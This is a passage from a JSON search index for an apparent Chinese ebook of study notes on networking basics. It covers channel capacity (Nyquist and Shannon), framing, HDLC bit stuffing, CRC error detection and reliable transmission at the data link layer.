\u4fe1\u9053\u7684\u6781\u9650\u5bb9\u91cf","text":"<p>\u4fe1\u53f7\u5728\u4fe1\u9053\u4e2d\u4f20\u8f93\uff0c\u5982\u679c\u566a\u58f0\u8f83\u5c0f\uff0c\u90a3\u4e48\u4fe1\u53f7\u65f6\u6b63\u5e38\u7684\u3002\u5982\u679c\u566a\u58f0\u5f88\u5927\uff0c\u90a3\u4e48\u4fe1\u53f7\u5c31\u65e0\u6cd5\u4f7f\u7528\u3002\u5f53\u566a\u58f0\u4e00\u5b9a\u65f6\uff0c\u9700\u8981\u6539\u53d8\u4fe1\u53f7\u7684\u632f\u5e45\u548c\u5f3a\u5ea6\u7b49\uff0c\u7528\u6765\u63d0\u5347\u4fe1\u566a\u6bd4\u3002</p> <p>\u5931\u771f\u539f\u56e0\uff1a\u7801\u5143\u4f20\u8f93\u901f\u7387\uff1b\u4fe1\u53f7\u4f20\u64ad\u8ddd\u79bb\uff1b\u566a\u58f0\u5e72\u6270\uff1b\u4f20\u8f93\u5a92\u4f53\u8d28\u91cf\u3002</p> <p>\u5948\u6c0f\u51c6\u5219\uff1a\u5728\u5047\u8bbe\u7406\u60f3\u6761\u4ef6\u4e0b\uff0c\u4e3a\u4e86\u907f\u514d\u7801\u95f4\u4e32\u6270\uff0c\u7801\u5143\u4f20\u8f93\u901f\u7387\u662f\u6709\u4e0a\u9650\u7684\u3002\u7406\u60f3\u4f4e\u901a\u4fe1\u9053\u6700\u9ad8\u901f\u7387\u662f 2W Baud(\u6ce2\u7279\uff0c\u7801\u5143/\u79d2) \uff0c\u7406\u60f3\u5e26\u901a\u4fe1\u9053\u6700\u9ad8\u7801\u5143\u901f\u7387\u662f W Baud\u3002</p> <p>\u7801\u5143\u4f20\u8f93\u901f\u7387\uff08\u6ce2\u7279\u7387\uff0c\u8c03\u5236\u901f\u7387\uff09\u4e0e\u6bd4\u7279\u7387\u7684\u5173\u7cfb\uff1a\u5982\u679c\u4e00\u4e2a\u7801\u5143\u53ea\u643a\u5e26\u4e00\u4e2a\u6bd4\u7279\u4fe1\u606f\u91cf\u65f6\uff08\u4e00\u4e2a\u6ce2\u5f62\u8868\u793a\u4e00\u4e2a\u6bd4\u7279\uff09\uff0c\u5219\u6ce2\u7279\u7387 = \u6bd4\u7279\u7387\u3002\u5982\u679c\u4e00\u4e2a\u7801\u5143\u643a\u5e26 N \u4e2a\u6bd4\u7279\u4fe1\u606f\u91cf\u65f6\uff0c\u6ce2\u7279\u7387 = N * \u6bd4\u7279\u7387\u3002\u6240\u4ee5\u8981\u63d0\u9ad8\u4fe1\u606f\u4f20\u8f93\u901f\u7387\uff0c\u5c31\u9700\u8981\u63d0\u9ad8\u6bcf\u4e00\u4e2a\u7801\u5143\u80fd\u643a\u5e26\u66f4\u591a\u6bd4\u7279\u7684\u4fe1\u606f\u91cf\uff08\u591a\u5143\u5236\uff09\u3002\u5b9e\u9645\u4fe1\u9053\u6240\u80fd\u4f20\u8f93\u7684\u6700\u9ad8\u7801\u5143\u901f\u7387\uff0c\u660e\u663e\u4f4e\u4e8e\u5948\u6c0f\u51c6\u5219\u7ed9\u51fa\u7684\u8fd9\u4e2a\u4e0a\u9650\u3002</p> <p>\u9999\u519c\u516c\u5f0f\uff1a\u5e26\u5bbd\u53d7\u9650\u4e14\u6709\u9ad8\u65af\u767d\u566a\u97f3\u7684\u4fe1\u9053\uff0c\u7684\u6781\u9650\u4fe1\u606f\u4f20\u8f93\u901f\u7387\u3002</p> <p>c = W * log2(1 + S / N)</p> <p>c\uff1a\u4fe1\u9053\u7684\u6781\u9650\u4fe1\u606f\u4f20\u8f93\u901f\u7387\uff08b/s\uff09</p> <p>W: \u4fe1\u9053\u5e26\u5bbd\uff08Hz\uff09</p> <p>S: \u4fe1\u9053\u5185\u6240\u4f20\u4fe1\u53f7\u7684\u5e73\u5747\u529f\u7387</p> <p>N: \u4fe1\u9053\u5185\u7684\u9ad8\u65af\u566a\u58f0\u529f\u7387</p> <p>S/N \u4fe1\u566a\u6bd4\uff08dB =  10 * log10(S/N)) \u5355\u4f4d\u662f\u5206\u8d1d</p> <p>\u5728\u4fe1\u9053\u5e26\u5bbd\u4e00\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c\u6839\u636e\u5948\u6c0f\u51c6\u5219\u548c\u9999\u519c\u516c\u5f0f\uff0c\u60f3\u8981\u63d0\u9ad8\u4fe1\u606f\u7684\u4f20\u8f93\u901f\u7387\uff0c\u5c31\u5fc5\u987b\u91c7\u7528\u591a\u5143\u5236\uff08\u66f4\u597d\u7684\u8c03\u5236\u65b9\u6cd5\uff09\uff0c\u63d0\u9ad8\u4fe1\u9053\u4e2d\u7684\u4fe1\u566a\u6bd4\u3002</p> <p>\u4f8b\u98981\uff1a\u4f1a\u5f71\u54cd\u4fe1\u9053\u6570\u636e\u4f20\u8f93\u901f\u7387\u7684\u662f\uff1a\u4fe1\u566a\u6bd4\uff1b\u9891\u7387\u5e26\u5bbd\uff1b\u8c03\u5236\u901f\u5ea6\u3002\u4e0d\u4f1a\u5f71\u54cd\u6570\u636e\u4f20\u8f93\u901f\u7387\u7684\u662f\u4fe1\u53f7\u4f20\u64ad\u901f\u5ea6\u3002\u6839\u636e\u9999\u519c\u516c\u5f0f\uff0c\u4f20\u8f93\u901f\u5ea6\u00a9\u548c\u9891\u9053\u5e26\u5bbd(W)\u6210\u6b63\u6bd4\uff0c\u548c\u4fe1\u566a\u6bd4\u4e5f\u6709\u5173\uff08\u5bf9\u6570\u5173\u7cfb\uff09\u3002\u6839\u636e\u5948\u6c0f\u51c6\u5219\uff0c\u8c03\u5236\u901f\u5ea6\u51b3\u5b9a\u4e86\u6bcf\u79d2\u4ea7\u751f\u5bf9\u5c11\u4fe1\u53f7\uff0c\u548c\u4f20\u8f93\u901f\u7387\u6709\u5173\u3002\u4fe1\u53f7\u4f20\u8f93\u901f\u5ea6\u548c\u4fe1\u9053\u6570\u636e\u4f20\u8f93\u901f\u7387\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\u3002</p> <p>\u8fd8\u6709\u6d89\u53ca\u9999\u519c\u516c\u5f0f\u7684\u8ba1\u7b97\uff08\u76ee\u524d\u4e86\u89e3\u4e3a\u4e3b\uff09</p>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#26-2","title":"2.6 \u7b2c2\u7ae0 \u7269\u7406\u5c42 \u7ae0\u8282\u5c0f\u7ed3","text":"<p>\u4e3b\u8981\u77e5\u8bc6\u70b9</p> <ul> <li>\u7269\u7406\u5c42\u8981\u89e3\u51b3\u7684\u95ee\u9898\uff1b</li> <li>\u7269\u7406\u5c42\u534f\u8bae\u7684\u4e3b\u8981\u4efb\u52a1\uff1b</li> <li>\u7269\u7406\u5c42\u4e0b\u9762\u7684\u4f20\u8f93\u5a92\u4f53\uff1b</li> <li>\u7269\u7406\u5c42\u4f20\u8f93\u65b9\u5f0f\uff1a\u4e32\u884c\u4f20\u8f93\uff08\u591a\u4e2a\u6bd4\u7279\u5728\u4e00\u6839\u4f20\u8f93\u7ebf\u4e0a\u4f20\u8f93\uff09\u548c\u5e76\u884c\u4f20\u8f93\uff08\u591a\u4e2a\u6bd4\u7279\u5728\u591a\u6839\u4f20\u8f93\u7ebf\u4e0a\u4f20\u8f93\uff0c\u7528\u4e8e\u8ba1\u7b97\u673a\u5185\u90e8\u6570\u636e\u4f20\u8f93\uff09\uff1b\u540c\u6b65\u4f20\u8f93\uff08\u4e00\u4e2a\u6bd4\u7279\u63a5\u7740\u4e00\u4e2a\u4f20\u8f93\uff0c\u4e2d\u95f4\u6ca1\u6709\u95f4\u9694\uff0c\u6bcf\u4e2a\u6bd4\u7279\u7684\u5e02\u573a\u76f8\u7b49\uff09\u5f02\u6b65\u4f20\u8f93\uff1b\u5355\u5de5\u4f20\u8f93\u53cc\u5de5\u4f20\u8f93</li> <li>\u7f16\u7801\u548c\u8c03\u5236\uff1a\u7f16\u7801\uff08\u6570\u5b57\u4fe1\u53f7\u8f6c\u6362\u6210\u53e6\u4e00\u79cd\u6570\u5b57\u4fe1\u53f7\uff0c\u5728\u6570\u5b57\u4fe1\u9053\u4e2d\u4f20\u64ad\uff1b\u6a21\u62df\u4fe1\u53f7\u8f6c\u6362\u6210\u6570\u5b57\u4fe1\u53f7\uff0c\u5728\u6570\u5b57\u4fe1\u9053\u4e2d\u4f20\u64ad\uff09\uff1b\u8c03\u5236\uff08\u4efb\u4f55\u4fe1\u53f7\u8f6c\u6362\u6210\u6a21\u62df\u4fe1\u53f7\uff0c\u5728\u6a21\u62df\u4fe1\u9053\u4e2d\u4f20\u64ad\uff0c\u5206\u4e3a\u57fa\u672c\u8c03\u5236\u548c\u6df7\u5408\u8c03\u5236\uff0c\u4e8c\u5143\u5236\u548c\u591a\u5143\u5236\uff09\uff1b\u7801\u5143</li> <li>\u4fe1\u9053\u7684\u6781\u9650\u5bb9\u91cf\uff08\u9999\u519c\u5b9a\u5f8b\uff0c\u5948\u6c0f\u51c6\u5219\uff09\u2014\u2014\u91cd\u70b9\u548c\u96be\u70b9</li> </ul>"},{"location":"ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/#27-2","title":"2.7 \u7b2c2\u7ae0 \u7269\u7406\u5c42 \u4e60\u9898\u8bfe","text":"<p>1\u3001\u7269\u7406\u5c42\u534f\u8bae\u4e3b\u8981\u4efb\u52a1\uff1a\u600e\u6837\u5728\u8fde\u63a5\u5404\u79cd\u8ba1\u7b97\u673a\u7684\u4f20\u8f93\u5a92\u4f53\u4e0a\uff0c\u4f20\u8f93\u6570\u636e\u6bd4\u7279\u6d41\u3002\u4e3a\u6570\u636e\u94fe\u8def\u5c42\u5c4f\u853d\u4e86\u5404\u79cd\u4f20\u8f93\u5a92\u4f53\u7684\u5dee\u5f02\uff0c\u4f7f\u5f97\u6570\u636e\u94fe\u8def\u5c42\u53ea\u9700\u8981\u8003\u8651\u5982\u4f55\u5b8c\u6210\u672c\u5c42\u7684\u534f\u8bae\u548c\u670d\u52a1\uff0c\u800c\u4e0d\u9700\u8981\u8003\u8651\u7f51\u7edc\u5177\u4f53\u7684\u4f20\u8f93\u5a92\u4f53\u662f\u4ec0\u4e48</p> <ul> <li>\u673a\u68b0\u7279\u6027\uff1a\u63a5\u53e3\u548c\u63a5\u7ebf\u5668\u7684\u5916\u5f62\uff08\u5f62\u72b6\u5c3a\u5bf8\uff0c\u5f15\u811a\u6570\u76ee\u548c\u6392\u5217\uff0c\u56fa\u5b9a\u548c\u9501\u5b9a\u88c5\u7f6e\uff09</li> <li>\u7535\u6c14\u7279\u5f81\uff1a\u63a5\u53e3\u7535\u7f06\u4e0a\u5404\u6761\u7ebf\u7684\u7535\u538b\u8303\u56f4</li> <li>\u529f\u80fd\u7279\u5f81\uff1a\u67d0\u4e00\u4e2a\u7535\u5e73\u7684\u7535\u538b\u7684\u610f\u4e49</li> <li>\u8fc7\u7a0b\u7279\u5f81\uff1a\u4e0d\u540c\u529f\u80fd\u7684\u5404\u79cd\u53ef\u80fd\u4e8b\u4ef6\u7684\u51fa\u73b0\u987a\u5e8f</li> </ul> <p>\u7279\u6b8a\uff1a\u7269\u7406\u5730\u5740\u662f MAC \u5730\u5740\uff08\u786c\u4ef6\u5730\u5740\uff09\uff0c\u5c5e\u4e8e\u6570\u636e\u94fe\u8def\u5c42</p> <p>2\u3001\u5948\u6c0f\u51c6\u5219\uff1a\u7406\u60f3\u4f4e\u901a\u4fe1\u9053\u6700\u9ad8\u7801\u5143\u4f20\u8f93\u901f\u7387 = 2W Baud = 2W (\u7801\u5143\u6bcf\u79d2)\uff1b\u7406\u60f3\u5e26\u901a\u4fe1\u9053\u7684\u6700\u9ad8\u7801\u5143\u4f20\u8f93\u901f\u7387\u662f W Baud\uff08\u6ce2\u7279\uff09</p> <p>\u4e0d\u7ba1\u4ec0\u4e48\u6280\u672f\uff0c\u4e3b\u8981\u5173\u6ce8\u53ef\u4ee5\u8c03\u5236\u7684\u4e0d\u540c\u6ce2\u5f62\uff08\u7801\u5143\uff09\u7684\u6570\u91cf(X)</p> <p>\u6570\u636e\u4f20\u8f93\u901f\u7387\uff08\u6bd4\u7279\u6bcf\u79d2\uff09 = \u7801\u5143\u4f20\u8f93\u901f\u7387\uff08\u7801\u5143\u6bcf\u79d2\uff09 * \u6bcf\u4e2a\u7801\u5143\u53ef\u4ee5\u643a\u5e26\u7684\u6bd4\u7279\u6570\u91cf log2X </p> <p>3\u3001\u9999\u519c\u516c\u5f0f\uff1a\u5e26\u5bbd\u53d7\u9650\u4e14\u6709\u9ad8\u65af\u767d\u566a\u58f0\u5e72\u6270\u7684\u4fe1\u9053\u7684\u6781\u9650\u4fe1\u606f\u4f20\u8f93\u901f\u7387\u3002</p> <p>c = W * log2(1 + S / N) \u4fe1\u566a\u6bd4\u901a\u5e38\u9700\u8981\u548c\u5206\u8d1d\u8f6c\u6362 dB = 10 * log10(S/N)</p> <p>\u4fe1\u9053\u5e26\u5bbd\u8d8a\u5927\uff0c\u6216\u8005\u4fe1\u9053\u4e2d\u4fe1\u566a\u6bd4\u8d8a\u5927\uff0c\u4fe1\u606f\u7684\u6781\u9650\u4f20\u8f93\u901f\u7387\u8d8a\u9ad8\u3002</p> <p>4\u3001\u7f16\u7801\u7c7b\u578b\uff1a\u4e0d\u5f52\u96f6\u7f16\u7801NRZ\uff0c\u5f52\u96f6\u7f16\u7801RZ\uff0c\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff0c\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff0c\u53cd\u5411\u4e0d\u5f52\u96f6\u7f16\u7801 NRZI \u7b49\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"03 \u6570\u636e\u94fe\u8def\u5c42","text":""},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#_1","title":"\u7b2c\u4e09\u7ae0 \u6570\u636e\u94fe\u8def\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 19781  \u9605\u8bfb40\u5206\u949f</p> <p>https://www.bilibili.com/video/BV1c4411d7jb?p=21</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p21-31","title":"P21 3.1 \u6570\u636e\u94fe\u8def\u5c42\u6982\u8ff0","text":"<p>\u6570\u636e\u94fe\u8def\u5c42\u5730\u4f4d\uff1a\u4f4d\u4e8e\u7269\u7406\u5c42\u4e4b\u4e0a\uff0c\u4e3a\u7f51\u7edc\u5c42\u63d0\u4f9b\u670d\u52a1\u3002</p> <ul> <li> <p>\u94fe\u8def\uff1a\u4e00\u4e2a\u7ed3\u70b9\u548c\u53e6\u4e00\u4e2a\u76f8\u90bb\u7ed3\u70b9\u4e4b\u95f4\u7684\u7269\u7406\u7ebf\u8def\uff08\u4e2d\u95f4\u6ca1\u6709\u5176\u4ed6\u7684\u7ed3\u70b9\uff09</p> </li> <li> <p>\u6570\u636e\u94fe\u8def\uff1a\u7269\u7406\u94fe\u8def+\u8f6f\u4ef6\u786c\u4ef6+\u901a\u4fe1\u534f\u8bae\u3002\u6570\u636e\u94fe\u8def\u5c42\u4ee5\u5e27\u4e3a\u5355\u4f4d\u4f20\u8f93\u548c\u5904\u7406\u6570\u636e\u3002</p> </li> </ul> <p>\u4e3b\u8981\u95ee\u9898\uff1a\u5c01\u88c5\u6210\u5e27\u3001\u5dee\u9519\u68c0\u6d4b\u3001\u53ef\u9760\u4f20\u8f93\u3002</p> <ul> <li>\u5c01\u88c5\u6210\u5e27\uff1a\u6570\u636e\u94fe\u8def\u5c42\u4ea4\u4ed8\u7ed9\u7f51\u7edc\u5c42\u7684\u534f\u8bae\u6570\u636e\u5355\u5143\u5c31\u662f\u5e27\uff0c\u6570\u636e\u5b57\u6bb5\u6dfb\u52a0\u5e27\u5934\u548c\u5e27\u5c3e\u7684\u8fc7\u7a0b\u5c31\u662f\u5c01\u88c5\u6210\u5e27\u3002\u6570\u636e\u5b57\u6bb5\u5c31\u662f\u5411\u4e0a\u5c42\u4ea4\u4ed8\u7684\u534f\u8bae\u6570\u636e\u5355\u5143\u3002</li> <li>\u5dee\u9519\u68c0\u6d4b\uff1a\u5728\u5e27\u5c3e\u90e8\u6709\u4e00\u4e2a\u68c0\u9519\u7801\u3002\u6536\u5230\u5e27\u540e\uff0c\u6839\u636e\u7279\u5b9a\u7b97\u6cd5\uff0c\u5224\u65ad\u5e27\u6570\u636e\u662f\u5426\u5b58\u5728\u8bef\u7801\u3002</li> <li>\u53ef\u9760\u4f20\u8f93\uff1a\u8bef\u7801\u4e0d\u80fd\u5b8c\u5168\u907f\u514d\u3002\u5982\u679c\u80fd\u5b9e\u73b0\u53d1\u9001\u65b9\u53d1\u9001\u4ec0\u4e48\u6709\u6548\u5185\u5bb9\uff0c\u63a5\u6536\u65b9\u53ef\u4ee5\u83b7\u53d6\u8fd9\u90e8\u5206\u5185\u5bb9\uff0c\u5c31\u79f0\u4e3a\u53ef\u9760\u4f20\u8f93\u3002</li> </ul> <p>\u4f7f\u7528\u5e7f\u64ad\u4fe1\u9053\u7684\u6570\u636e\u94fe\u8def\u5c42\uff1a\u5171\u4eab\u5f0f\u4ee5\u592a\u7f51\u534f\u8bae CSMA/CD\uff08\u5168\u53cc\u5de5\u901a\u4fe1\uff0c\u9700\u8981\u5904\u7406\u6570\u636e\u78b0\u649e\uff09\uff0c802.11\u5c40\u57df\u7f51\u534f\u8bae CSMA/CA \u5206\u522b\u5bf9\u5e94\u6709\u7ebf\u7f51\u548c\u65e0\u7ebf\u7f51\u534f\u8bae\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p22-32","title":"P22 3.2 \u5c01\u88c5\u6210\u5e27","text":"<p>\u5c01\u88c5\u6210\u5e27\uff1a\u6570\u636e\u94fe\u8def\u5c42\u7ed9\u4e0a\u5c42\u7684\u534f\u8bae\u6570\u636e\u5355\u5143\uff0c\u6dfb\u52a0\u5e27\u5934\u548c\u5e27\u5c3e\uff0c\u4f7f\u5f97\u6210\u4e3a\u5e27\u3002\u5e27\u5934\u548c\u5e27\u5c3e\u7684\u4f5c\u7528\u662f\u5224\u65ad\u5e27\u7684\u8fb9\u754c\uff08\u5e27\u5934\u5e27\u5c3e\u662f\u8fb9\u754c\u7684\u6807\u5fd7\uff0c\u4ece\u7269\u7406\u5c42\u4f20\u9012\u7684\u6bd4\u7279\u6d41\u4e2d\uff0c\u89e3\u6790\u51fa\u4e00\u4e2a\u4e2a\u5e27\uff09\u3002</p> <p>\u5e27\u5206\u4e3a \u4ee5\u592a\u7f51 MAC \u5e27\u548c PPP \u5e27\uff0c\u6570\u636e\u683c\u5f0f\u4e0d\u540c\u3002</p> <p>MAC \u5e27\uff1a\u6709\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\uff0c\u53d1\u9001\u524d\uff0c\u7269\u7406\u5c42\u9700\u8981\u52a0\u4e00\u4e2a\u524d\u5bfc\u7801\uff0c\u4f5c\u4e3a\u5e27\u5f00\u59cb\u7684\u6807\u5fd7\u3002\u524d\u5bfc\u7801\u540e\u9762\u5c31\u662f MAC \u5e27\u3002\u4e0d\u540c\u5e27\u4e4b\u95f4\u95f4\u969496\u6bd4\u7279\u7684\u53d1\u9001\u65f6\u95f4\u3002</p> <p>\u900f\u660e\u4f20\u8f93\uff1a\u6570\u636e\u94fe\u8def\u5c42\u5bf9\u4e0a\u5c42\u4f20\u8f93\u7684\u6570\u636e\u6ca1\u6709\u4efb\u4f55\u9650\u5236\uff08\u5185\u5bb9\u548c\u5927\u5c0f\u90fd\u4e0d\u9650\u5236\uff09\u597d\u50cf\u6570\u636e\u94fe\u8def\u5c42\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u79f0\u4e3a\u900f\u660e\u4f20\u8f93\u3002</p> <p>\u53d1\u9001\u5e27\u4e4b\u524d\uff0c\u5bf9\u6570\u636e\u90e8\u5206\u8fdb\u884c\u626b\u63cf\u3002\u5982\u679c\u6570\u636e\u5b57\u6bb5\u4e00\u90e8\u5206\uff0c\u548c\u5e27\u5934\u6216\u8005\u5e27\u5c3e\u76f8\u540c\uff08\u7edf\u79f0\u5e27\u5b9a\u754c\u7b26\uff09\uff0c\u9996\u5148\u5728\u6570\u636e\u4e2d\u6dfb\u52a0\u8f6c\u4e49\u7b26\u53f7\u3002\u8fd9\u6837\u63a5\u6536\u65b9\u6839\u636e\u6839\u636e\u8f6c\u4e49\u7b26\u53f7\u5148\u5904\u7406\uff0c\u5c31\u53ef\u4ee5\u5206\u79bb\u6570\u636e\u8f7d\u8377\u90e8\u5206\u3002\u5982\u679c\u662f\u9762\u5411\u5b57\u8282\u7684\u94fe\u8def\uff0c\u90a3\u4e48\u5c31\u6dfb\u52a0\u5b57\u8282\u7684\u8f6c\u4e49\u7b26\uff1b\u5982\u679c\u662f\u9762\u5411\u6bd4\u7279\u7684\u94fe\u8def\uff0c\u5c31\u6dfb\u52a0\u6bd4\u7279\u7684\u8f6c\u4e49\u7b26\u3002</p> <p>\u4f8b\u9898\u4e2d\uff1a\u9ad8\u7ea7\u6570\u636e\u94fe\u8def\u63a7\u5236\u534f\u8bae HDLC \u91c7\u7528\u5e27\u5934\u548c\u5e27\u4e3a\u4e2d\u7684\u6807\u5fd7\u5b57\u6bb5\u4f5c\u4e3a\u5e27\u5b9a\u754c\u7b26\uff0c\u503c\u662f 01111110\u3002\u4f7f\u7528\u8fd9\u4e2a\u534f\u8bae\u7f16\u7801\u540e\uff0c\u9700\u8981\u5bf9\u6570\u636e\u4e2d\u8fde\u7eed\u76845\u4e2a1\uff0c\u540e\u9762\u589e\u52a00\uff0c\u8fdb\u884c\u8f6c\u4e49\u3002\u8fd9\u6837\uff0c\u63a5\u6536\u65b9\u5224\u65ad6\u4e2a\u8054\u7cfb\u76841\uff0c\u5c31\u662f\u5e27\u5b9a\u754c\u7b26\u3002</p> <p>\u5e27\u6570\u636e\u90e8\u5206\u5c3d\u91cf\u5927\uff08\u6709\u6548\u6570\u636e\u548c\u5e27\u5b9a\u754c\u7b26\u7684\u6bd4\u4f8b\u624d\u80fd\u589e\u52a0\uff0c\u63d0\u9ad8\u4f20\u8f93\u6548\u7387\uff09\uff0c\u540c\u65f6\u8003\u8651\u5dee\u9519\u63a7\u5236\uff0c\u6240\u4ee5\u89c4\u5b9a\u4e00\u4e2a\u5e27\u6570\u636e\u90e8\u5206\u6700\u5927\u957f\u5ea6\uff1a\u6700\u5927\u4f20\u9001\u5355\u5143 MTU\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p23-33","title":"P23 3.3 \u5dee\u9519\u68c0\u6d4b","text":"<ul> <li>\u6bd4\u7279\u5dee\u9519\uff1a\u4f20\u8f93\u8fc7\u7a0b\u4e2d01\u4ea7\u751f\u5dee\u9519</li> <li>\u8bef\u7801\u7387\uff1a\u9519\u8bef\u7684\u6bd4\u7279\u7684\u767e\u5206\u6bd4</li> <li>\u5dee\u9519\u68c0\u6d4b\u7801\uff08FCS\uff09\uff1a\u68c0\u6d4b\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u662f\u5426\u4ea7\u751f\u4e86\u6bd4\u7279\u5dee\u9519\u3002MAC \u5e27\u7684FCS\u662f\u56db\u5b57\u8282\uff0cPPP\u5e27\u7684FCS\u662f2\u5b57\u8282\u3002</li> </ul> <p>\u5dee\u9519\u68c0\u6d4b\u65b9\u6cd5\uff1a</p> <ul> <li> <p>\u5947\u5076\u6821\u9a8c\uff08\u6dfb\u52a0\u4e00\u4e2a0\u6216\u80051\uff0c\u4f7f\u5f97\u5168\u90e8\u7684\u6570\u636e\u4e2d0\u6216\u80051\u7684\u4e2a\u6570\u662f\u5947\u6570\u6216\u8005\u5076\u6570\uff09\u4f18\u70b9\u64cd\u4f5c\u7b80\u5355\u3002\u7f3a\u70b9\uff1a\u65e0\u6cd5\u5904\u7406\u8bef\u7801\u662f\u53cc\u6570\u7684\u60c5\u51b5\u3002\u5b9e\u9645\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u68c0\u6d4b\u65b9\u6cd5\u3002</p> </li> <li> <p>\u5faa\u73af\u5197\u4f59\u6821\u9a8c\uff08CRC\uff09\uff1a\u6536\u53d1\u53cc\u65b9\u7ea6\u5b9a\u4e00\u4e2a\u591a\u9879\u5f0f\uff0c\u7136\u540e\u628a\u6570\u636e\u8fdb\u884c\u591a\u9879\u5f0f\u8ba1\u7b97\uff0c\u628a\u4f59\u6570\u4f5c\u4e3a\u5dee\u9519\u6821\u9a8c\u7801\u53d1\u9001\u3002\u63a5\u6536\u65b9\u6536\u5230\u6570\u636e\u540e\uff0c\u4e5f\u4f7f\u7528\u8fd9\u4e2a\u516c\u5f0f\u8ba1\u7b97\uff0c\u5bf9\u6bd4\u4e24\u4e2a\u7684\u4f59\u6570\u662f\u5426\u76f8\u540c\uff0c\u5224\u65ad\u6570\u636e\u4f20\u8f93\u662f\u5426\u6709\u8bef\u3002\u5e38\u7528\u7684\u6709 CRC-16 = x^16\uff0cCRC 32 \u7b49\u3002</p> </li> </ul> <p>\u5dee\u9519\u68c0\u6d4b\u8bf4\u660e\uff1a\u68c0\u9519\u7801\u53ea\u80fd\u53d1\u73b0\u9519\u8bef\uff0c\u4e0d\u80fd\u5b9a\u4f4d\u9519\u8bef\uff0c\u65e0\u6cd5\u7ea0\u6b63\u9519\u8bef\u3002\u5982\u679c\u60f3\u7ea0\u6b63\u9519\u8bef\uff0c\u9700\u8981\u66f4\u591a\u4fe1\u606f\uff0c\u5f00\u9500\u6bd4\u8f83\u5927\u3002CRC \u6709\u6bd4\u8f83\u597d\u7684\u68c0\u9519\u80fd\u529b\uff0c\u8ba1\u7b97\u8f83\u590d\u6742\uff0c\u5bb9\u6613\u4f7f\u7528\u786c\u4ef6\u5b9e\u73b0\uff0c\u5e7f\u6cdb\u5e94\u7528\u4e8e\u6570\u636e\u94fe\u8def\u5c42\u3002</p> <p>\u5bf9\u4e8e\u9519\u8bef\uff0c\u53ef\u4ee5\u91c7\u7528\u91cd\u4f20\u65b9\u5f0f\u7ea0\u6b63\u9519\u8bef\uff08\u53ef\u9760\u8fde\u63a5\uff09\uff1b\u6216\u8005\u76f4\u63a5\u4e22\u5f03\u9519\u8bef\u7684\u5e27\uff08\u4e0d\u53ef\u9760\u8fde\u63a5\uff09\uff0c\u8fd9\u4e2a\u53d6\u51b3\u4e8e\u4e0a\u5c42\u9700\u8981\u7684\u662f\u53ef\u9760\u670d\u52a1\u8fd8\u662f\u4e0d\u53ef\u9760\u670d\u52a1\u3002</p>"},{"location":"ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#p24-341","title":"P24 3.4.1 \u53ef\u9760\u4f20\u8f93\u7684\u57fa\u672c\u6982\u5ff5","text":"<p>\u4e0d\u53ef\u9760\u4f20\u8f93\uff1a\u4ec5\u4e22\u5f03\u8bef\u7801\u7684\u5e27\uff1b</p> <p>\u53ef\u9760\u4f20\u8f93\uff1a\u53d1\u9001\u7aef\u53d1\u9001\u4ec0\u4e48\uff0c\u63a5\u6536\u7aef\u5c31\u6536\u5230\u4ec0\u4e48\u3002</p> <p>\u6709\u7ebf\u94fe\u8def\u8bef\u7801\u7387\u8f83\u4f4e\uff0c\u4e3a\u4e86\u51cf\u5c0f\u5f00\u9500\uff0c\u4e0d\u5728\u6570\u636e\u94fe\u8def\u5c42\u505a\u5904\u7406\uff0c\u5e76\u4e0d\u8981\u6c42\u5411\u4e0a\u5c42\u63d0\u4f9b\u53ef\u9760\u4f20\u8f93\u670d\u52a1\u3002\u5373\u4f7f\u51fa\u73b0\u8bef\u7801\uff0c\u53ef\u9760\u4f20\u8f93\u7684\u95ee\u9898\u7531\u4e0a\u5c42\u5e94\u7528\u5904\u7406\u3002</p> <p>\u65e0\u7ebf\u94fe\u8def\u5bb9\u6613\u6536\u5230\u5e72\u6270\uff0c\u8bef\u7801\u7387\u6bd4\u8f83\u9ad8\uff0c\u6240\u4ee5\u5fc5\u987b\u5411\u4e0a\u5c42\u63d0\u4f9b\u53ef\u9760\u4f20\u8f93\u670d\u52a1\u3002</p> <p>\u5206\u7ec4\u4e22\u5931\uff0c\u5206\u7ec4\u5931\u5e8f\uff0c\u5206\u7ec4\u91cd\u590d\u8fd9\u4e9b\u4f20\u8f93\u9519\u8bef\uff0c\u4f1a\u51fa\u73b0\u5728\u4e0a\u5c42\u670d\u52a1\u3002\u6240\u4ee5\u53ef\u9760\u4f20\u8f93\u670d\u52a1\u4e0d\u4ec5\u5c40\u9650\u4e8e\u6570\u636e\u94fe\u8def\u5c42\uff0c\u5176\u4ed6\u5404\u5c42\u5747\u53ef\u9009\u62e9\u53ef\u9760\u4f20\u8f93\u3002</p> 